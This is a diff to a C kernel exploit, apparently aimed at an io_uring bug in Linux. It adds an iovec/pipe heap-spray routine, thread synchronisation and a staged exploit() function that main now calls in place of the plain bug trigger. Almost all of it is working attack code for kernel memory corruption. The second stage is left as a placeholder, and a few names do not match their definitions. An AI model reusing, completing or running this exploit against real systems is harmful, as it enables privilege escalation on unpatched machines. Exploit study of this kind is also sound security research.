@@ -361,6 +361,17 @@ enum {
   __res;                              \
 })
 
+#define CHECK(x, n) ({                  \
+  __typeof__(x) __res = (x);          \
+  if (__res != n) {   \
+    LOG("SYSCHK(" #x ") = %d\n", __res);\
+    int error_val = errno;            \
+    LOG("errno: %d\n", error_val);    \
+    exit(1);                          \
+  }                                   \
+  __res;                              \
+})
+
 int pin_to_cpu(int cpu) {
     int rc;
     int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
@@ -523,6 +534,125 @@ void trigger_bug(Context *context) {
   poll_event(context);
 }
 
+int sync_pipes[2] = { 0 };
+char global_buffer[0x4000] = { 0 };
+
+void *do_iov_spray(void *idx) {
+  pin_on_cpu(CPU);
+
+  unsigned long pipe_idx = (unsigned long)(idx);
+  char data[0x100] = {};
+  struct iovec iovec_array[256 / 16];
+  assert(sizeof(iovec_array) == 256);
+
+  for (int i = 0; i < 256 / 16; i++) {
+    iovec_array[i].iov_len = 1;
+    iovec_array[i].iov_base =
+        (void *)((char *)global_buffer + pipe_idx * 16 + i);
+  }
+
+  if (pipe_idx >= MAX_256_PIPE) {
+    goto spray_256;
+  }
+
+  read(pipes[pipe_idx][0], data, 1);
+  CHECK(*data, 'S');
+  write(sync_pipes[1], "E", 1);
+  // printf("pipe %ld spaied\n", pipe_idx);
+  // if (pipe_idx == 0) printf("allocating 256 for 0\n");
+  // printf("pipe idx %ld allocated\n", pipe_idx);
+  int res = readv(pipes[pipe_idx][0], iovec_array, 256 / 16);
+  if (res != 256 / 16) {
+    printf("pipe %ld res is %d\n", pipe_idx, res);
+    // iov might be corrupted, do that again without iov
+    res = read(pipes[pipe_idx][0], (char *)global_buffer + pipe_idx * 16,
+               256 / 16);
+    printf("second read, res is %d\n", res);
+  }
+  write(sync_pipes[1], "E", 1);
+
+spray_256:
+  // wait for signal
+  // *data = 0;
+  // read(pipes[pipe_idx][0], data, 1);
+  // assert(*data == 'S');
+  // write(sync_pipes[1], "S", 1);
+
+  // // after having the signal, do the spray
+  // readv(pipes[pipe_idx][0], iovec_array, 256/16);
+  // // keep sleeping to prevent too many freed pages
+
+  // write(sync_pipes[1], "S", 1);
+  while (1) {
+    sleep(10000);
+  }
+}
+
+#define MAX_PIPE_NUM 0x400
+#define PIPE_PAGE_NUM 0x600
+#define FIRST_PIPE_SPRAY 0x180
+
+int pipes[MAX_PIPE_NUM][2];
+
+void exploit(Context *context) {
+  int exp_pipes[4] = { 0 };
+
+  // char global_buffer[0x100] = { 0 };
+
+  for (int i = 0; i < MAX_PIPE_NUM; i++) {
+    SYSCHK(pipe(pipes[i]));
+    // prefault the page
+    CHECK(fcntl(pipes[i][1], F_SETPIPE_SZ, 0x1000), 0x1000);
+    write(pipes[i][1], global_buffer, 1);
+    CHECK(read(pipes[i][0], global_buffer, 1), 1);
+  }
+
+  // prepare sync pipe
+  SYSCHK(pipe(sync_pipes));
+  CHECK(fcntl(sync_pipes[1], F_SETPIPE_SZ, 0x1000), 0x1000);
+  write(sync_pipes[1], global_buffer, 1);
+  read(sync_pipes[0], global_buffer, 1);
+
+  // prepare exp pipe
+  SYSCHK(pipe(exp_pipes));
+  write(exp_pipes[1], global_buffer, 1);
+  read(exp_pipes[0], global_buffer, 1);
+  write(exp_pipes[1], global_buffer, 1);
+
+  // a good time to setup context for the second stage
+  for (int i = 0; i < PIPE_PAGE_NUM; i++) {
+    if (pipe(pipe_pages[i]) < 0) {
+      perror("pipe");
+      exit(0);
+    }
+    CHECK(fcntl(pipe_pages[i][1], F_SETPIPE_SZ, 0x1000), 0x1000);
+  }
+
+  for (unsigned long i = 0; i < MAX_PIPE_NUM; i++) {
+    pthread_t pid;
+    pthread_create(&pid, NULL, do_iov_spray, (void *)i);
+  }
+  printf("preparing...\n");
+  sleep(1);
+
+  printf("[*] STAGE 1: defragmentation\n");
+  // spray the first part
+  for (int i = 0; i < FIRST_PIPE_SPRAY; i++) {
+    usleep(10);
+    write(pipes[i][1], "S", 1);
+  }
+
+  // sync with the spray
+  int count = FIRST_PIPE_SPRAY;
+  while (count) {
+    usleep(10);
+    int res = read(sync_pipes[0], global_buffer, count);
+    count -= res;
+  }
+
+  printf("[*] STAGE 2: trigger the bug\n");
+}
+
 int main() {
   puts("Starting exploit...");
 
@@ -534,12 +664,14 @@ int main() {
     .buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0),
   };
 
-  trigger_bug(&context);
+  exploit(&context);
 
-  printf("%lx\n", io_uring_get_cqe(&context.io_uring)[0].user_data);
-  printf("%d\n", io_uring_get_cqe(&context.io_uring)[0].res);
+  // trigger_bug(&context);
 
-  puts(context.buf);
+  // printf("%lx\n", io_uring_get_cqe(&context.io_uring)[0].user_data);
+  // printf("%d\n", io_uring_get_cqe(&context.io_uring)[0].res);
+
+  // puts(context.buf);
 
   return 0;
 }
